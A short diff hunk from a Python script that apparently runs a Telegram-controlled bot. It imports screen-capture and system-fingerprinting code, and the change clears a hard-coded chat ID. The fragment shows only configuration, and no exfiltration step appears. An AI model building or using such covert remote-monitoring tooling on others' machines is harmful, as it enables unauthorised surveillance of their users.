@@ -41,7 +41,7 @@ from PIL import ImageGrab
 from uuid import getnode as get_mac
 
 # -----------------------------------------------------------------------------
-CHAT_ID = '259793522'  #Get chat id from telegram app
+CHAT_ID = ''  #Get chat id from telegram app
 BOTS_ALIVE = []
 MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
 PLAT_FORM = platform.platform()
